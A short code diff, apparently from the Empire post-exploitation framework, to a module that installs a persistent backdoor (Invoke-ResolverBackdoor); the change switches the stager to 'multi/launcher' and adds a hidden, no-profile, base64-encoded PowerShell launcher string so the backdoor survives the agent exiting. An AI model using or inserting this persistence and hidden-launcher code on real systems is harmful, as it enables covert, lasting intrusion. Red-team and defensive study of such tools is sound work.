@@ -136,7 +136,7 @@ Invoke-ResolverBackdoor"""
 
         else:
             # set the listener value for the launcher
-            stager = self.mainMenu.stagers.stagers["launcher"]
+            stager = self.mainMenu.stagers.stagers["multi/launcher"]
             stager.options['Listener']['Value'] = listenerName
             stager.options['Base64']['Value'] = "False"
 
@@ -175,7 +175,8 @@ Invoke-ResolverBackdoor"""
             script = helpers.obfuscate(psScript=script, obfuscationCommand=obfuscationCommand)
         # transform the backdoor into something launched by powershell.exe
         # so it survives the agent exiting  
-        launcher = helpers.powershell_launcher(script) 
+        modifiable_launcher = "powershell.exe -noP -sta -w 1 -enc "
+        launcher = helpers.powershell_launcher(script, modifiable_launcher) 
         stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
         parts = stagerCode.split(" ")
 
